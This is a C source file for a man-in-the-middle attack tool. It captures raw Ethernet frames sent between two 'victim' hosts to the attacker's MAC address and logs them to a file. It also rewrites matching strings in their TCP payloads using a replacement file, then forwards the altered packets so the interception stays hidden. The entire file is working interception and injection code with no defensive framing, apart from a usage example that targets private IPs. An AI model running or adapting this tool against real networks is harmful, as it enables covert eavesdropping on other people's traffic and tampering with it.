/* due to dprintf function in BSD systems */
#define _WITH_DPRINTF
#include <stdio.h>

#include <stdlib.h>
#include <string.h>
#include <signal.h>
//#include <netinet/ether.h>
#include <fcntl.h>
#include <unistd.h>

#include "utils.h"
#include "arp.h"
#include "packet.h"
#include "mutils.h"

/* packet buffer size */
// HACK
#define BUF_SIZE 1540 //ETH_FRAME_LEN (commented because of the BSD compatibility) 1500 + 26 (bpf header) + 14 (etd header)
/* buffer for replacement pairs size */
#define REPL_BUF_SIZE 64

rawsock_t rs; // socket
int lfd; // log file descriptor, -1 of log disabled

/* array of replacement pairs. Even items are matches,
 * odds their replaicement. A match end a replacement
 * should have the same length */
char ** repl_pairs_arr; 

int repl_pairs_c = 0; // number of items (repl_pairs * 2)

/*
 * this method looks at packet source eth address
 * and returns what direction the packet is heading
*/
pkt_dir_t
get_pkt_dir(struct ip_packet * p)
{
	if(memcmp(&p->eth_h.ether_shost, hwa1, ETHER_ADDR_LEN) == 0)
		return PD_1TO2;
	else if(memcmp(&p->eth_h.ether_shost, hwa2, ETHER_ADDR_LEN) == 0)
		return PD_2TO1;
	else
		return PD_OTHER;
}

/*
 * change packet mac addresses depending on direction and send it
 */
void
forwardpacket(struct ip_packet * p, size_t p_size)
{
	pkt_dir_t pd = get_pkt_dir(p);

	// set packet source mac address as host mac address
	memcpy(&p->eth_h.ether_shost, hwa_host, ETHER_ADDR_LEN);

	// set correct packet dest mac address
	if(pd == PD_1TO2)
		memcpy(&p->eth_h.ether_dhost, hwa2, ETHER_ADDR_LEN);
	else if(pd == PD_2TO1)
		memcpy(&p->eth_h.ether_dhost, hwa1, ETHER_ADDR_LEN);
	else {
		perror("packet direction error in forwardpacket\n");
		return;
	}

	// send packet
	rawsend(rs, p, p_size);

}

/* 
 * buf is packet (array of bytes] got from recv method.
 * this method looks at the packet and if it is ip4 packet
 * sended from a victim to the second victim, log it and forward it
 * by calling forwardpacket(). In other case ignore the packet
 */
void
processbuf(uint8_t * buf, size_t numbytes)
{
	struct eth_packet * ep = (struct eth_packet *) buf;
	struct ip_packet * ip_p = (struct ip_packet *) buf;

	// ignore if it is not ip packet
	if(ep->type != htons(ETH_P_IP)){
    //printf("Not IP packet\n");
		return;
	}

	// ignore if packet mac address is not attackers
	if(memcmp(ep->dest, hwa_host, ETHER_ADDR_LEN) != 0){
    //printf("Not attackers MAC\n");
		return;
	}
	// ignore if packet is not from one of the victim
	if(memcmp(ep->source, hwa1, ETHER_ADDR_LEN) != 0 &&
	   memcmp(ep->source, hwa2, ETHER_ADDR_LEN) != 0){
    //printf("Not packet from victim\n");
		return;
	}

	// ignore if packet source and destination ip arent targets
	if(get_pkt_dir(ip_p) == PD_OTHER)
		return;

	/* write packet short info to STDOUT*/
  //dprintpkt_l(1, ip_p, numbytes);
  //dprintpkt_l(lfd, ip_p, numbytes); 
  //printf("%d\n",lfd);

  /* write packet long info into log file (log packet) */
  if(lfd >= 0)
    dprintpkt_l(lfd, ip_p, numbytes);

	/* inject packet */
	int ic;
	if((ic = injectpkt(ip_p, numbytes, repl_pairs_arr, repl_pairs_c))){
		//printf("INJECTED!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n");
		//dprintpkt_l(1, ip_p, numbytes);
		//printf("%d\n", ic);
		//printf("<%s>\n",arr[3]);
	}

	/* forward packet to other target */
	forwardpacket(ip_p, numbytes);
}

/* if 7. argument (file), reads replacement pairs from file and save to
 * repl_pairs_arr, repl_pairs_c
 * FILE used because of the parsing ability
 * if 7. argument is -, don't load any replacement pairs */
void
load_repl_pairs(int argc, char ** argv)
{
  int i = 0;
  int len;

  if(argc >= 7 && strcmp(argv[6], "-") != 0){
  	// open file
  	FILE * rf = fopen(argv[6], "r");
  	if(rf == NULL){
  		perror("Replacement file error");
  		exit(1);
  	}
  	// load repl_pairs_c
  	if(fscanf(rf, "%d", &repl_pairs_c) != 1){
  		dprintf(2,"Replacement pairs count in file is not a number\n");
  		exit(1);
  	}
  	if(repl_pairs_c%2 != 0){
  		dprintf(2,"Replacement pairs count is not an even number\n");
  		exit(1);
  	}

  	// get to next line
  	while(1){
  		int c = fgetc(rf);
  		if(c == '\n') break;
  		if(c == EOF) {
	  		dprintf(2,"Invalid replacement file format\n");
	  		exit(1);
	  	}
  	}

  	// load repl_pairs_arr
  	repl_pairs_arr = (char **) calloc(repl_pairs_c, sizeof(char *));

  	for(i = 0; i < repl_pairs_c; i+=2){
  		repl_pairs_arr[i] = (char *) malloc(REPL_BUF_SIZE);
  		repl_pairs_arr[i + 1] = (char *) malloc(REPL_BUF_SIZE);

  		// laod first word
  		if(fgets(repl_pairs_arr[i], REPL_BUF_SIZE, rf) == NULL){
			dprintf(2,"Replacement pair string number %d error\n", i);
	  		exit(1);
	  	}

	  	// load second word
	  	if(fgets(repl_pairs_arr[i + 1], REPL_BUF_SIZE, rf) == NULL){
			dprintf(2,"Replacement pair string number %d error\n", i + 1);
	  		exit(1);
	  	}

	  	// dprintf keep the new lines in the strings, remove them
	  	len = strlen(repl_pairs_arr[i]);
	  	if(len && repl_pairs_arr[i][len-1] == '\n') repl_pairs_arr[i][len-1] = '\0';
	  	
	  	len = strlen(repl_pairs_arr[i + 1]);
	  	if(len && repl_pairs_arr[i + 1][len-1] == '\n') repl_pairs_arr[i + 1][len-1] = '\0';


	  	// check if len is the same
	  	if(strlen(repl_pairs_arr[i]) != strlen(repl_pairs_arr[i + 1])){
			dprintf(2,"Replacement pair strings should have the same length (%d:%d, %d:%d)\n",
				i, (int) strlen(repl_pairs_arr[i]), i+1, (int) strlen(repl_pairs_arr[i+1]));
	  		exit(1);
	  	}

	  	printf("In TCP packets, '%s' will be replaced with '%s'\n", repl_pairs_arr[i], repl_pairs_arr[i+1]);

	}
  } else {
    printf("Packets wont be injected.\n");
  	// repl_pairs_c is set to 0 already
  }
}

/* 
 * this method triggers on SIGINT and
 * close socket and exit program
 */
void
cleanup()
{
  puts("Finishing up...");

  rawclose(rs);

  if(close(lfd) < 0)
    perror("closing lfd");

  exit(0);
}

void
showusage(int argc, char ** argv)
{
  printf("Usage: %s <interface> <target1-ip> \
<target1-mac> <target2-ip> <target2-mac> [<replacement-file> [<log-file>]]\n\n\
Example:\n%s wlan0 192.168.1.1 \
12:23:34:45:56:67 192.168.1.42 11:22:33:44:55:66 replace.txt log.txt\n\
%s wlan0 192.168.1.1 \
12:23:34:45:56:67 192.168.1.42 11:22:33:44:55:66 - /dev/stdout\n", argv[0], argv[0], argv[0]);

  exit(1);
}

int
main(int argc, char ** argv)
{
  int numbytes;

  uint8_t buf[BUF_SIZE];

  if (argc < 6)
    showusage(argc, argv);

  /* save arguments to proper global vars
   * and convert them to binary representation */
  process_args(argc, argv);

  /* if more argument, load vars repl_pairs_arr
   * and repl_pairs_c */
  load_repl_pairs(argc, argv);

  /* init log fd (lfd) */
  if(argc >= 8){
  	lfd = open(argv[7], O_RDWR|O_APPEND|O_CREAT);
  	if(lfd < 0){
  		perror("open");
  		exit(1);
  	}
  } else {
  	lfd = -1; /* disable logging */
  }

  // initialize socket
  rs = rawsocket_ip(if_name);

  // cleanup if pressing ^C
  signal(SIGINT, cleanup);

  // start sniffing
  puts("Sniffing started...");

  while (1) {
    // recv packet
    numbytes = rawrecv(rs, buf, BUF_SIZE);
    //printbuf(buf, numbytes);

    // check, log, modify and forward packet
    if(numbytes < 0) {
    	perror("recv error");
    } else {
    	processbuf(buf, numbytes);
    }
  }

  return 0;
}
